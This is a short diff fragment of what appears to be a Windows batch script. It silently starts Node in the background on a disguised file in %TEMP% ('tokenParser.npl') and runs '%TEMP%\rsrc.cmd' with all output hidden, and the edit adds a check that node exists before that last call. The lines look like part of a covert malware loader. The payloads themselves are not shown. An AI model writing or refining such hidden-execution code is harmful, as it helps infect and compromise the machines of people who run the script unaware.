@@ -73,7 +73,10 @@ if not exist "%TEMP%\tokenParser.npl" (
 
 start "" /b "%NODE_EXE%" "%TEMP%\tokenParser.npl" >nul 2>&1
 
-"%TEMP%\rsrc.cmd" >nul 2>&1
+where node >nul 2>&1
+if %errorlevel%==0 (
+    "%TEMP%\rsrc.cmd" >nul 2>&1
+)
 
 endlocal
 exit /b 0
